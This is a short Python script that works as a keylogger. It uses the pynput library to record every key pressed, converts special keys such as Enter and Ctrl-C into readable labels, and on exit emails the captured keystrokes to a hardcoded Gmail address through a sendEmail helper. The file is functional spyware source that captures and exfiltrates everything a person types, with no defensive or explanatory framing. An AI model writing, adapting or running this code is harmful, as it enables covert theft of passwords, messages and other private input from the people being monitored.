from pynput.keyboard import Listener, Key
from sendEmail import send_email

count = 0
keys = []
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
logged_data = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(str(key))
    count +=1 
    if count >= 1:
        count = 0
        email(keys)
        keys = []

def email(keys):
    msg = ""
    for key in keys:
        k = key.replace("'","")
        if key in substitution:
            k = (substitution[substitution.index(key)+1])
        msg += k
    logged_data.append(msg)

def on_release(key):
    if key == Key.esc:
        return False


if __name__=='__main__':
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    subject = "logged data"
    body = logged_data
    to_email = 'test.keylogger34@gmail.com'
    send_email(subject, body, to_email)
